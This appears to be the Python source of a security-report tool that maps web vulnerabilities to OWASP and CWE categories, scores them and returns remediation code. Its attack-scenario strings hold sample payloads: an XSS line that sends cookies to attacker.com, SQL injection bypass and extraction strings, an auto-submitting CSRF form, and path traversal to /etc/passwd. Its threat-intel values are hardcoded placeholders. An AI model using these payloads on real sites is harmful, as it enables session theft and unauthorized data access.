"""
VulnHawk Advanced AI Security Agent

A sophisticated AI-powered security analysis system that provides:
- Deep vulnerability analysis with context awareness
- Intelligent remediation suggestions with code examples
- Exploit chain detection and risk assessment
- Business impact analysis
- Compliance mapping (OWASP, CWE, NIST)

Author: Manoj Gowda
"""

import re
import json
import hashlib
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Any
from enum import Enum
from datetime import datetime


class AttackVector(Enum):
    """CVSS v3.1 Attack Vectors"""
    NETWORK = "N"
    ADJACENT = "A"
    LOCAL = "L"
    PHYSICAL = "P"


class AttackComplexity(Enum):
    """CVSS v3.1 Attack Complexity"""
    LOW = "L"
    HIGH = "H"


class PrivilegesRequired(Enum):
    """CVSS v3.1 Privileges Required"""
    NONE = "N"
    LOW = "L"
    HIGH = "H"


class UserInteraction(Enum):
    """CVSS v3.1 User Interaction"""
    NONE = "N"
    REQUIRED = "R"


class Impact(Enum):
    """CVSS v3.1 Impact levels"""
    NONE = "N"
    LOW = "L"
    HIGH = "H"


@dataclass
class ThreatIntelligence:
    """Threat intelligence data for a vulnerability"""
    cve_ids: List[str] = field(default_factory=list)
    cwe_ids: List[str] = field(default_factory=list)
    exploit_available: bool = False
    exploit_maturity: str = "unproven"  # unproven, poc, functional, high
    in_the_wild: bool = False
    ransomware_associated: bool = False
    apt_associated: List[str] = field(default_factory=list)


@dataclass
class RemediationStep:
    """A single remediation step with code example"""
    order: int
    title: str
    description: str
    code_example: Optional[str] = None
    language: Optional[str] = None
    effort: str = "low"  # low, medium, high
    breaking_change: bool = False


@dataclass
class VulnerabilityAnalysis:
    """Complete AI-powered vulnerability analysis"""
    vulnerability_id: str
    vulnerability_type: str
    severity: str
    cvss_score: float
    cvss_vector: str

    # AI Analysis
    executive_summary: str
    technical_details: str
    attack_scenario: str
    business_impact: str

    # Threat Intelligence
    threat_intel: ThreatIntelligence

    # Remediation
    remediation_steps: List[RemediationStep]
    quick_fix: Optional[str] = None

    # Compliance
    owasp_category: str = ""
    compliance_frameworks: Dict[str, str] = field(default_factory=dict)

    # Risk Assessment
    exploitability_score: float = 0.0
    impact_score: float = 0.0
    risk_rating: str = "medium"

    # Metadata
    analysis_timestamp: str = ""
    confidence_score: float = 0.0


class SecurityKnowledgeBase:
    """
    Comprehensive security knowledge base for vulnerability analysis.
    Contains expert knowledge about vulnerabilities, exploits, and remediations.
    """

    # OWASP Top 10 2021 Mapping
    OWASP_MAPPING = {
        'xss': {
            'category': 'A03:2021 - Injection',
            'description': 'Cross-Site Scripting allows attackers to inject malicious scripts',
            'cwe': ['CWE-79', 'CWE-80'],
            'severity_base': 6.1
        },
        'sqli': {
            'category': 'A03:2021 - Injection',
            'description': 'SQL Injection allows attackers to manipulate database queries',
            'cwe': ['CWE-89', 'CWE-564'],
            'severity_base': 9.8
        },
        'csrf': {
            'category': 'A01:2021 - Broken Access Control',
            'description': 'Cross-Site Request Forgery tricks users into performing unintended actions',
            'cwe': ['CWE-352'],
            'severity_base': 6.5
        },
        'ssrf': {
            'category': 'A10:2021 - Server-Side Request Forgery',
            'description': 'SSRF allows attackers to make requests from the server',
            'cwe': ['CWE-918'],
            'severity_base': 9.1
        },
        'xxe': {
            'category': 'A05:2021 - Security Misconfiguration',
            'description': 'XML External Entity injection exploits XML parsers',
            'cwe': ['CWE-611'],
            'severity_base': 7.5
        },
        'lfi': {
            'category': 'A01:2021 - Broken Access Control',
            'description': 'Local File Inclusion allows reading arbitrary files',
            'cwe': ['CWE-98', 'CWE-22'],
            'severity_base': 7.5
        },
        'rfi': {
            'category': 'A01:2021 - Broken Access Control',
            'description': 'Remote File Inclusion allows executing remote code',
            'cwe': ['CWE-98', 'CWE-94'],
            'severity_base': 9.8
        },
        'rce': {
            'category': 'A03:2021 - Injection',
            'description': 'Remote Code Execution allows running arbitrary code',
            'cwe': ['CWE-94', 'CWE-78'],
            'severity_base': 10.0
        },
        'idor': {
            'category': 'A01:2021 - Broken Access Control',
            'description': 'Insecure Direct Object Reference exposes internal objects',
            'cwe': ['CWE-639'],
            'severity_base': 6.5
        },
        'open_redirect': {
            'category': 'A01:2021 - Broken Access Control',
            'description': 'Open Redirect allows redirecting users to malicious sites',
            'cwe': ['CWE-601'],
            'severity_base': 4.7
        },
        'info_disclosure': {
            'category': 'A02:2021 - Cryptographic Failures',
            'description': 'Information Disclosure exposes sensitive data',
            'cwe': ['CWE-200', 'CWE-209'],
            'severity_base': 5.3
        },
        'authentication': {
            'category': 'A07:2021 - Identification and Authentication Failures',
            'description': 'Authentication bypass allows unauthorized access',
            'cwe': ['CWE-287', 'CWE-306'],
            'severity_base': 9.8
        },
        'headers': {
            'category': 'A05:2021 - Security Misconfiguration',
            'description': 'Missing security headers expose the application to attacks',
            'cwe': ['CWE-693', 'CWE-1021'],
            'severity_base': 4.3
        },
        'ssl': {
            'category': 'A02:2021 - Cryptographic Failures',
            'description': 'SSL/TLS misconfigurations weaken encryption',
            'cwe': ['CWE-295', 'CWE-326'],
            'severity_base': 5.9
        }
    }

    # Remediation Templates with Code Examples
    REMEDIATION_TEMPLATES = {
        'xss': {
            'quick_fix': 'Encode all user input before rendering in HTML context',
            'steps': [
                {
                    'title': 'Implement Output Encoding',
                    'description': 'Use context-aware output encoding for all user-controlled data',
                    'code': '''# Python/Flask Example
from markupsafe import escape

@app.route('/search')
def search():
    query = request.args.get('q', '')
    # Always escape user input before rendering
    safe_query = escape(query)
    return render_template('search.html', query=safe_query)

# In Jinja2 templates, use autoescape (enabled by default)
# {{ user_input }}  <- automatically escaped
# {{ user_input | safe }}  <- DANGEROUS: bypasses escaping''',
                    'language': 'python'
                },
                {
                    'title': 'Implement Content Security Policy',
                    'description': 'Add CSP headers to prevent inline script execution',
                    'code': '''# Flask-Talisman Example
from flask_talisman import Talisman

Talisman(app,
    content_security_policy={
        'default-src': "'self'",
        'script-src': "'self'",  # No 'unsafe-inline'!
        'style-src': ["'self'", "https://fonts.googleapis.com"],
        'img-src': ["'self'", "data:"],
    },
    content_security_policy_nonce_in=['script-src']
)''',
                    'language': 'python'
                },
                {
                    'title': 'Use HTTPOnly and Secure Cookie Flags',
                    'description': 'Prevent JavaScript access to sensitive cookies',
                    'code': '''# Flask Configuration
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SECURE'] = True  # HTTPS only
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'  # CSRF protection''',
                    'language': 'python'
                }
            ]
        },
        'sqli': {
            'quick_fix': 'Use parameterized queries or ORM instead of string concatenation',
            'steps': [
                {
                    'title': 'Use Parameterized Queries',
                    'description': 'Never concatenate user input into SQL queries',
                    'code': '''# VULNERABLE - Never do this!
query = f"SELECT * FROM users WHERE id = {user_id}"

# SECURE - Use parameterized queries
from sqlalchemy import text

# SQLAlchemy with bound parameters
result = db.session.execute(
    text("SELECT * FROM users WHERE id = :user_id"),
    {"user_id": user_id}
)

# Or use the ORM (preferred)
user = User.query.filter_by(id=user_id).first()
user = User.query.get(user_id)''',
                    'language': 'python'
                },
                {
                    'title': 'Implement Input Validation',
                    'description': 'Validate and sanitize all user inputs',
                    'code': '''from wtforms import Form, IntegerField
from wtforms.validators import DataRequired, NumberRange

class SearchForm(Form):
    user_id = IntegerField('User ID', validators=[
        DataRequired(),
        NumberRange(min=1, max=999999)
    ])

# Validate before using
form = SearchForm(request.args)
if form.validate():
    user = User.query.get(form.user_id.data)''',
                    'language': 'python'
                },
                {
                    'title': 'Apply Least Privilege',
                    'description': 'Use database accounts with minimal required permissions',
                    'code': '''-- Create read-only user for web application
CREATE USER webapp_readonly WITH PASSWORD 'secure_password';
GRANT SELECT ON ALL TABLES IN SCHEMA public TO webapp_readonly;

-- Revoke dangerous permissions
REVOKE CREATE, DROP, ALTER ON SCHEMA public FROM webapp_readonly;''',
                    'language': 'sql'
                }
            ]
        },
        'csrf': {
            'quick_fix': 'Implement CSRF tokens on all state-changing requests',
            'steps': [
                {
                    'title': 'Enable CSRF Protection',
                    'description': 'Use Flask-WTF CSRF protection for all forms',
                    'code': '''from flask_wtf.csrf import CSRFProtect

csrf = CSRFProtect()
csrf.init_app(app)

# In your HTML templates
<form method="POST">
    <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
    <!-- form fields -->
    <button type="submit">Submit</button>
</form>''',
                    'language': 'python'
                },
                {
                    'title': 'Protect AJAX Requests',
                    'description': 'Include CSRF token in AJAX headers',
                    'code': '''// JavaScript - Include CSRF token in all AJAX requests
const csrfToken = document.querySelector('meta[name="csrf-token"]').content;

fetch('/api/action', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'X-CSRFToken': csrfToken
    },
    body: JSON.stringify(data)
});''',
                    'language': 'javascript'
                },
                {
                    'title': 'Use SameSite Cookies',
                    'description': 'Configure cookies with SameSite attribute',
                    'code': '''# Flask Configuration
app.config['SESSION_COOKIE_SAMESITE'] = 'Strict'  # or 'Lax'
app.config['SESSION_COOKIE_SECURE'] = True''',
                    'language': 'python'
                }
            ]
        },
        'open_redirect': {
            'quick_fix': 'Validate redirect URLs against a whitelist or ensure same-origin',
            'steps': [
                {
                    'title': 'Implement Safe URL Validation',
                    'description': 'Only allow redirects to trusted destinations',
                    'code': '''from urllib.parse import urlparse, urljoin
from flask import request, redirect, url_for

def is_safe_url(target):
    """Validate redirect URL to prevent open redirect attacks."""
    if not target:
        return False
    ref_url = urlparse(request.host_url)
    test_url = urlparse(urljoin(request.host_url, target))
    return (test_url.scheme in ('http', 'https') and
            ref_url.netloc == test_url.netloc)

@app.route('/login', methods=['POST'])
def login():
    # ... authentication logic ...

    next_page = request.args.get('next')
    if next_page and is_safe_url(next_page):
        return redirect(next_page)
    return redirect(url_for('dashboard'))''',
                    'language': 'python'
                },
                {
                    'title': 'Use Indirect References',
                    'description': 'Map redirect destinations to safe identifiers',
                    'code': '''ALLOWED_REDIRECTS = {
    'dashboard': '/dashboard',
    'profile': '/user/profile',
    'settings': '/user/settings',
}

@app.route('/redirect/<target>')
def safe_redirect(target):
    destination = ALLOWED_REDIRECTS.get(target)
    if destination:
        return redirect(destination)
    return redirect(url_for('index'))''',
                    'language': 'python'
                }
            ]
        },
        'lfi': {
            'quick_fix': 'Use whitelist-based file access and avoid user input in file paths',
            'steps': [
                {
                    'title': 'Implement Whitelist Validation',
                    'description': 'Only allow access to predefined files',
                    'code': '''import os
from flask import abort, send_from_directory

ALLOWED_FILES = {
    'terms': 'legal/terms.pdf',
    'privacy': 'legal/privacy.pdf',
    'guide': 'docs/user_guide.pdf'
}

@app.route('/download/<file_id>')
def download_file(file_id):
    # Only allow whitelisted files
    if file_id not in ALLOWED_FILES:
        abort(404)

    filepath = ALLOWED_FILES[file_id]
    directory = os.path.dirname(filepath)
    filename = os.path.basename(filepath)

    return send_from_directory(
        os.path.join(app.static_folder, directory),
        filename,
        as_attachment=True
    )''',
                    'language': 'python'
                },
                {
                    'title': 'Sanitize File Paths',
                    'description': 'Remove path traversal sequences',
                    'code': '''import os
from werkzeug.utils import secure_filename

def safe_file_path(user_input, base_directory):
    """Safely construct file path preventing traversal."""
    # Remove path traversal attempts
    filename = secure_filename(user_input)

    # Construct full path
    full_path = os.path.join(base_directory, filename)

    # Verify path is within base directory
    real_path = os.path.realpath(full_path)
    real_base = os.path.realpath(base_directory)

    if not real_path.startswith(real_base):
        raise ValueError("Path traversal detected")

    return real_path''',
                    'language': 'python'
                }
            ]
        },
        'headers': {
            'quick_fix': 'Add security headers using Flask-Talisman or manually',
            'steps': [
                {
                    'title': 'Implement Security Headers',
                    'description': 'Add comprehensive security headers',
                    'code': '''from flask_talisman import Talisman

Talisman(app,
    force_https=True,
    strict_transport_security=True,
    strict_transport_security_max_age=31536000,
    content_security_policy={
        'default-src': "'self'",
        'script-src': "'self'",
        'style-src': ["'self'", "https://fonts.googleapis.com"],
    },
    x_content_type_options=True,
    x_xss_protection=True,
    referrer_policy='strict-origin-when-cross-origin',
    session_cookie_secure=True,
    session_cookie_http_only=True
)''',
                    'language': 'python'
                },
                {
                    'title': 'Manual Header Configuration',
                    'description': 'Add headers without external library',
                    'code': '''@app.after_request
def add_security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    response.headers['Permissions-Policy'] = 'geolocation=(), microphone=()'
    return response''',
                    'language': 'python'
                }
            ]
        },
        'authentication': {
            'quick_fix': 'Implement proper session management and multi-factor authentication',
            'steps': [
                {
                    'title': 'Secure Password Storage',
                    'description': 'Use strong hashing algorithms for passwords',
                    'code': '''from werkzeug.security import generate_password_hash, check_password_hash

class User(db.Model):
    password_hash = db.Column(db.String(256), nullable=False)

    def set_password(self, password):
        # Use PBKDF2 with SHA-256 and high iteration count
        self.password_hash = generate_password_hash(
            password,
            method='pbkdf2:sha256:260000'
        )

    def check_password(self, password):
        return check_password_hash(self.password_hash, password)''',
                    'language': 'python'
                },
                {
                    'title': 'Implement Account Lockout',
                    'description': 'Prevent brute force attacks',
                    'code': '''class User(db.Model):
    failed_login_attempts = db.Column(db.Integer, default=0)
    locked_until = db.Column(db.DateTime, nullable=True)

    def is_locked(self):
        if self.locked_until and self.locked_until > datetime.utcnow():
            return True
        return False

    def record_failed_login(self):
        self.failed_login_attempts += 1
        if self.failed_login_attempts >= 5:
            self.locked_until = datetime.utcnow() + timedelta(minutes=15)
        db.session.commit()

    def record_successful_login(self):
        self.failed_login_attempts = 0
        self.locked_until = None
        self.last_login = datetime.utcnow()
        db.session.commit()''',
                    'language': 'python'
                },
                {
                    'title': 'Session Security',
                    'description': 'Regenerate session on authentication',
                    'code': '''from flask import session

@app.route('/login', methods=['POST'])
def login():
    user = authenticate(username, password)
    if user:
        # Regenerate session ID to prevent fixation
        session.clear()

        login_user(user)
        session.permanent = True
        session['_fresh'] = True

        return redirect(url_for('dashboard'))''',
                    'language': 'python'
                }
            ]
        }
    }

    # Attack Scenarios by Vulnerability Type
    ATTACK_SCENARIOS = {
        'xss': """
**Reflected XSS Attack Scenario:**
1. Attacker identifies a search parameter vulnerable to XSS: `/search?q=<script>alert(1)</script>`
2. Attacker crafts malicious payload: `<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>`
3. Attacker sends phishing email with link: `https://vulnerable-site.com/search?q=<malicious_script>`
4. Victim clicks link while logged in
5. Script executes in victim's browser context
6. Session cookie sent to attacker's server
7. Attacker hijacks victim's session

**Stored XSS Attack Scenario:**
1. Attacker posts malicious comment containing JavaScript
2. Every user viewing the comment has the script execute
3. Worm-like propagation possible (e.g., MySpace Samy worm)
""",
        'sqli': """
**SQL Injection Attack Scenario:**
1. Attacker finds login form vulnerable to SQLi
2. Username field: `admin' OR '1'='1' --`
3. Query becomes: `SELECT * FROM users WHERE username='admin' OR '1'='1' --'`
4. Authentication bypassed - attacker gains admin access

**Data Exfiltration Scenario:**
1. Attacker uses UNION-based injection: `' UNION SELECT username, password FROM users --`
2. Extracts all usernames and password hashes
3. Offline cracking recovers plaintext passwords
4. Credential reuse attacks on other services

**Blind SQLi with Time-Based Extraction:**
1. `'; IF (SELECT COUNT(*) FROM users WHERE is_admin=1) > 0 WAITFOR DELAY '00:00:05' --`
2. 5-second delay confirms admin users exist
3. Binary search extracts data character by character
""",
        'csrf': """
**CSRF Attack Scenario:**
1. Victim is logged into banking site
2. Attacker hosts malicious page with hidden form:
   ```html
   <form action="https://bank.com/transfer" method="POST" id="malform">
     <input type="hidden" name="to" value="attacker_account">
     <input type="hidden" name="amount" value="10000">
   </form>
   <script>document.getElementById('malform').submit();</script>
   ```
3. Victim visits attacker's page (via phishing email)
4. Form auto-submits using victim's authenticated session
5. Money transferred to attacker without victim's knowledge
""",
        'open_redirect': """
**Open Redirect Attack Scenario:**
1. Legitimate URL: `https://trusted-site.com/login?next=/dashboard`
2. Attacker crafts: `https://trusted-site.com/login?next=https://evil-site.com/phishing`
3. URL appears legitimate (starts with trusted domain)
4. After login, victim redirected to attacker's phishing page
5. Phishing page mimics trusted site, captures additional credentials
6. OAuth token theft: `https://trusted-site.com/oauth/authorize?redirect_uri=https://evil.com`
""",
        'lfi': """
**Local File Inclusion Attack Scenario:**
1. Vulnerable endpoint: `/view?file=report.pdf`
2. Attacker modifies: `/view?file=../../../etc/passwd`
3. Server returns contents of /etc/passwd
4. Escalation: `/view?file=../../../var/log/auth.log` - credentials in logs
5. With PHP: `/view?file=php://filter/convert.base64-encode/resource=config.php`
6. Source code disclosure reveals database credentials
7. Direct database access achieved
"""
    }

    # Business Impact Descriptions
    BUSINESS_IMPACTS = {
        'critical': """
**Critical Business Impact:**
- Complete system compromise possible
- Mass data breach affecting all users
- Regulatory fines (GDPR: up to 4% annual revenue, CCPA: $7,500/violation)
- Reputational damage leading to customer loss
- Potential class action lawsuits
- Stock price impact for public companies
- Business continuity disruption
""",
        'high': """
**High Business Impact:**
- Significant data exposure risk
- Individual user account compromise
- Targeted attacks on high-value accounts
- Compliance violations (PCI-DSS, HIPAA)
- Customer trust erosion
- Incident response costs ($150-300 per compromised record)
""",
        'medium': """
**Medium Business Impact:**
- Limited data exposure
- Phishing attack enablement
- Session hijacking of individual users
- Internal information disclosure
- Potential stepping stone for larger attacks
""",
        'low': """
**Low Business Impact:**
- Minor information disclosure
- User experience degradation
- Defense-in-depth weakness
- Best practice violation
- Audit finding
"""
    }


class AISecurityAgent:
    """
    Advanced AI Security Agent for vulnerability analysis.

    This agent provides intelligent, context-aware security analysis
    that goes beyond simple pattern matching.
    """

    def __init__(self):
        self.knowledge_base = SecurityKnowledgeBase()
        self.analysis_cache = {}

    def analyze_vulnerability(self, vulnerability: Dict[str, Any]) -> VulnerabilityAnalysis:
        """
        Perform comprehensive AI-powered vulnerability analysis.

        Args:
            vulnerability: Dictionary containing vulnerability details

        Returns:
            VulnerabilityAnalysis: Complete analysis with remediation
        """
        vuln_type = vulnerability.get('type', 'unknown').lower()
        severity = vulnerability.get('severity', 'medium').lower()
        url = vulnerability.get('url', '')
        parameter = vulnerability.get('parameter', '')
        payload = vulnerability.get('payload', '')
        evidence = vulnerability.get('evidence', '')

        # Get knowledge base data
        kb_data = self.knowledge_base.OWASP_MAPPING.get(vuln_type, {})

        # Calculate CVSS
        cvss_score, cvss_vector = self._calculate_cvss(vuln_type, severity, vulnerability)

        # Generate analysis components
        executive_summary = self._generate_executive_summary(vuln_type, severity, url)
        technical_details = self._generate_technical_details(vulnerability, kb_data)
        attack_scenario = self._get_attack_scenario(vuln_type)
        business_impact = self._assess_business_impact(severity)

        # Get threat intelligence
        threat_intel = self._gather_threat_intelligence(vuln_type, vulnerability)

        # Generate remediation steps
        remediation_steps = self._generate_remediation_steps(vuln_type)
        quick_fix = self.knowledge_base.REMEDIATION_TEMPLATES.get(vuln_type, {}).get('quick_fix', '')

        # Calculate risk scores
        exploitability = self._calculate_exploitability(vuln_type, vulnerability)
        impact_score = self._calculate_impact_score(severity)
        risk_rating = self._calculate_risk_rating(exploitability, impact_score)

        # Compliance mapping
        compliance = self._map_compliance(vuln_type, kb_data)

        return VulnerabilityAnalysis(
            vulnerability_id=vulnerability.get('id', hashlib.md5(f"{url}{parameter}".encode()).hexdigest()[:12]),
            vulnerability_type=vuln_type,
            severity=severity,
            cvss_score=cvss_score,
            cvss_vector=cvss_vector,
            executive_summary=executive_summary,
            technical_details=technical_details,
            attack_scenario=attack_scenario,
            business_impact=business_impact,
            threat_intel=threat_intel,
            remediation_steps=remediation_steps,
            quick_fix=quick_fix,
            owasp_category=kb_data.get('category', 'Unknown'),
            compliance_frameworks=compliance,
            exploitability_score=exploitability,
            impact_score=impact_score,
            risk_rating=risk_rating,
            analysis_timestamp=datetime.utcnow().isoformat(),
            confidence_score=self._calculate_confidence(vulnerability)
        )

    def _calculate_cvss(self, vuln_type: str, severity: str, vuln: Dict) -> tuple:
        """Calculate CVSS v3.1 score and vector."""
        kb_data = self.knowledge_base.OWASP_MAPPING.get(vuln_type, {})
        base_score = kb_data.get('severity_base', 5.0)

        # Adjust based on context
        if vuln.get('authenticated_required'):
            base_score -= 1.0
        if vuln.get('user_interaction_required'):
            base_score -= 0.5

        # Build CVSS vector
        av = "N"  # Network
        ac = "L" if vuln_type in ['sqli', 'xss', 'csrf'] else "H"
        pr = "N" if vuln_type in ['sqli', 'xss'] else "L"
        ui = "R" if vuln_type in ['xss', 'csrf', 'open_redirect'] else "N"

        # Impact
        if severity == 'critical':
            c, i, a = "H", "H", "H"
        elif severity == 'high':
            c, i, a = "H", "H", "N"
        elif severity == 'medium':
            c, i, a = "L", "L", "N"
        else:
            c, i, a = "N", "L", "N"

        vector = f"CVSS:3.1/AV:{av}/AC:{ac}/PR:{pr}/UI:{ui}/S:U/C:{c}/I:{i}/A:{a}"

        return round(base_score, 1), vector

    def _generate_executive_summary(self, vuln_type: str, severity: str, url: str) -> str:
        """Generate executive-level summary."""
        kb_data = self.knowledge_base.OWASP_MAPPING.get(vuln_type, {})

        severity_text = {
            'critical': 'CRITICAL vulnerability requiring immediate attention',
            'high': 'HIGH severity vulnerability requiring urgent remediation',
            'medium': 'MEDIUM severity vulnerability that should be addressed',
            'low': 'LOW severity finding for improvement',
            'info': 'INFORMATIONAL finding for awareness'
        }

        return f"""
A {severity_text.get(severity, 'security vulnerability')} was identified.

**Vulnerability Type:** {vuln_type.upper()}
**OWASP Category:** {kb_data.get('category', 'Unknown')}
**Affected Endpoint:** {url}

**Summary:** {kb_data.get('description', 'Security vulnerability detected.')}

This finding has been classified under {kb_data.get('category', 'Unknown')} in the OWASP Top 10 2021.
Immediate remediation is {'strongly recommended' if severity in ['critical', 'high'] else 'recommended'}.
"""

    def _generate_technical_details(self, vuln: Dict, kb_data: Dict) -> str:
        """Generate technical analysis details."""
        return f"""
**Technical Analysis:**

- **Vulnerability Class:** {kb_data.get('description', 'Unknown')}
- **CWE References:** {', '.join(kb_data.get('cwe', ['Unknown']))}
- **Affected URL:** {vuln.get('url', 'N/A')}
- **Vulnerable Parameter:** {vuln.get('parameter', 'N/A')}
- **HTTP Method:** {vuln.get('method', 'GET')}
- **Payload Used:** `{vuln.get('payload', 'N/A')}`

**Evidence:**
```
{vuln.get('evidence', 'No evidence captured')}
```

**Root Cause:**
The application fails to properly validate, sanitize, or encode user-supplied input
before processing it. This allows an attacker to inject malicious content that the
application interprets and executes.
"""

    def _get_attack_scenario(self, vuln_type: str) -> str:
        """Get realistic attack scenario."""
        return self.knowledge_base.ATTACK_SCENARIOS.get(
            vuln_type,
            "Attack scenario documentation not available for this vulnerability type."
        )

    def _assess_business_impact(self, severity: str) -> str:
        """Assess business impact."""
        return self.knowledge_base.BUSINESS_IMPACTS.get(severity, self.knowledge_base.BUSINESS_IMPACTS['medium'])

    def _gather_threat_intelligence(self, vuln_type: str, vuln: Dict) -> ThreatIntelligence:
        """Gather threat intelligence data."""
        kb_data = self.knowledge_base.OWASP_MAPPING.get(vuln_type, {})

        # Simulated threat intel (in production, would query threat feeds)
        exploit_maturity = "functional" if vuln_type in ['sqli', 'xss', 'rce'] else "poc"
        in_wild = vuln_type in ['sqli', 'xss', 'rce', 'ssrf']

        return ThreatIntelligence(
            cve_ids=[],  # Would be populated from CVE database
            cwe_ids=kb_data.get('cwe', []),
            exploit_available=vuln_type in ['sqli', 'xss', 'lfi', 'rce'],
            exploit_maturity=exploit_maturity,
            in_the_wild=in_wild,
            ransomware_associated=vuln_type in ['sqli', 'rce'],
            apt_associated=['APT28', 'APT29'] if vuln_type == 'rce' else []
        )

    def _generate_remediation_steps(self, vuln_type: str) -> List[RemediationStep]:
        """Generate detailed remediation steps."""
        templates = self.knowledge_base.REMEDIATION_TEMPLATES.get(vuln_type, {})
        steps = templates.get('steps', [])

        remediation_steps = []
        for i, step in enumerate(steps, 1):
            remediation_steps.append(RemediationStep(
                order=i,
                title=step.get('title', f'Step {i}'),
                description=step.get('description', ''),
                code_example=step.get('code', ''),
                language=step.get('language', 'python'),
                effort='medium',
                breaking_change=False
            ))

        return remediation_steps

    def _calculate_exploitability(self, vuln_type: str, vuln: Dict) -> float:
        """Calculate exploitability score (0-10)."""
        base_scores = {
            'sqli': 9.0, 'rce': 10.0, 'xss': 7.5, 'csrf': 6.5,
            'ssrf': 8.5, 'xxe': 7.0, 'lfi': 7.5, 'rfi': 9.5,
            'open_redirect': 5.0, 'idor': 6.0, 'headers': 3.0,
            'authentication': 8.0, 'info_disclosure': 4.0, 'ssl': 4.5
        }
        return base_scores.get(vuln_type, 5.0)

    def _calculate_impact_score(self, severity: str) -> float:
        """Calculate impact score (0-10)."""
        impact_map = {
            'critical': 10.0, 'high': 8.0, 'medium': 5.0, 'low': 2.5, 'info': 1.0
        }
        return impact_map.get(severity, 5.0)

    def _calculate_risk_rating(self, exploitability: float, impact: float) -> str:
        """Calculate overall risk rating."""
        risk_score = (exploitability + impact) / 2
        if risk_score >= 9.0:
            return 'critical'
        elif risk_score >= 7.0:
            return 'high'
        elif risk_score >= 4.0:
            return 'medium'
        else:
            return 'low'

    def _map_compliance(self, vuln_type: str, kb_data: Dict) -> Dict[str, str]:
        """Map vulnerability to compliance frameworks."""
        compliance = {
            'OWASP Top 10 2021': kb_data.get('category', 'Unknown'),
            'CWE': ', '.join(kb_data.get('cwe', ['Unknown'])),
        }

        # PCI-DSS mapping
        pci_map = {
            'xss': 'Requirement 6.5.7 - Cross-site scripting',
            'sqli': 'Requirement 6.5.1 - Injection flaws',
            'csrf': 'Requirement 6.5.9 - Cross-site request forgery',
            'authentication': 'Requirement 8 - Identify and authenticate access',
            'ssl': 'Requirement 4.1 - Use strong cryptography'
        }
        if vuln_type in pci_map:
            compliance['PCI-DSS'] = pci_map[vuln_type]

        # NIST mapping
        nist_map = {
            'xss': 'SI-10 Information Input Validation',
            'sqli': 'SI-10 Information Input Validation',
            'authentication': 'IA-5 Authenticator Management',
            'headers': 'SC-8 Transmission Confidentiality and Integrity'
        }
        if vuln_type in nist_map:
            compliance['NIST 800-53'] = nist_map[vuln_type]

        return compliance

    def _calculate_confidence(self, vuln: Dict) -> float:
        """Calculate confidence score for the finding."""
        confidence = 0.5  # Base confidence

        if vuln.get('evidence'):
            confidence += 0.2
        if vuln.get('payload'):
            confidence += 0.15
        if vuln.get('confirmed'):
            confidence += 0.15

        return min(confidence, 1.0)

    def generate_report_summary(self, vulnerabilities: List[Dict]) -> Dict[str, Any]:
        """
        Generate a comprehensive security report summary.
        """
        analyses = [self.analyze_vulnerability(v) for v in vulnerabilities]

        severity_counts = {'critical': 0, 'high': 0, 'medium': 0, 'low': 0, 'info': 0}
        for analysis in analyses:
            severity_counts[analysis.severity] = severity_counts.get(analysis.severity, 0) + 1

        # Calculate overall risk
        risk_scores = [a.cvss_score for a in analyses]
        avg_risk = sum(risk_scores) / len(risk_scores) if risk_scores else 0

        # Get unique OWASP categories
        owasp_categories = list(set(a.owasp_category for a in analyses if a.owasp_category))

        return {
            'total_vulnerabilities': len(vulnerabilities),
            'severity_breakdown': severity_counts,
            'average_cvss_score': round(avg_risk, 1),
            'owasp_categories_affected': owasp_categories,
            'highest_risk_findings': [a for a in analyses if a.severity in ['critical', 'high']][:5],
            'remediation_priority': self._prioritize_remediation(analyses),
            'executive_summary': self._generate_overall_executive_summary(analyses, severity_counts)
        }

    def _prioritize_remediation(self, analyses: List[VulnerabilityAnalysis]) -> List[Dict]:
        """Prioritize remediation based on risk and effort."""
        priorities = []
        for analysis in sorted(analyses, key=lambda x: x.cvss_score, reverse=True):
            priorities.append({
                'vulnerability_id': analysis.vulnerability_id,
                'type': analysis.vulnerability_type,
                'cvss_score': analysis.cvss_score,
                'quick_fix': analysis.quick_fix,
                'priority_reason': f"CVSS {analysis.cvss_score} - {analysis.risk_rating.upper()} risk"
            })
        return priorities[:10]  # Top 10 priorities

    def _generate_overall_executive_summary(self, analyses: List[VulnerabilityAnalysis], counts: Dict) -> str:
        """Generate overall executive summary."""
        total = sum(counts.values())
        critical_high = counts.get('critical', 0) + counts.get('high', 0)

        risk_level = "CRITICAL" if counts.get('critical', 0) > 0 else \
                     "HIGH" if counts.get('high', 0) > 0 else \
                     "MODERATE" if counts.get('medium', 0) > 0 else "LOW"

        return f"""
# Security Assessment Executive Summary

## Overall Risk Level: {risk_level}

The security assessment identified **{total} vulnerabilities** across the application:
- **Critical:** {counts.get('critical', 0)}
- **High:** {counts.get('high', 0)}
- **Medium:** {counts.get('medium', 0)}
- **Low:** {counts.get('low', 0)}
- **Informational:** {counts.get('info', 0)}

{'**IMMEDIATE ACTION REQUIRED:** ' + str(critical_high) + ' critical/high severity vulnerabilities require urgent remediation.' if critical_high > 0 else ''}

## Key Recommendations:
1. Address all critical and high severity findings within 7 days
2. Implement security headers across all endpoints
3. Enable comprehensive input validation
4. Deploy Web Application Firewall (WAF) as additional protection layer
5. Establish regular security testing cadence

## Compliance Impact:
This assessment has identified findings that may impact compliance with PCI-DSS, GDPR, and SOC 2 requirements.
Remediation is recommended before the next compliance audit cycle.
"""


# Factory function for easy instantiation
def create_security_agent() -> AISecurityAgent:
    """Create and return a configured AI Security Agent."""
    return AISecurityAgent()


# Convenience function for single vulnerability analysis
def analyze_single_vulnerability(vulnerability: Dict[str, Any]) -> VulnerabilityAnalysis:
    """Analyze a single vulnerability and return detailed analysis."""
    agent = create_security_agent()
    return agent.analyze_vulnerability(vulnerability)
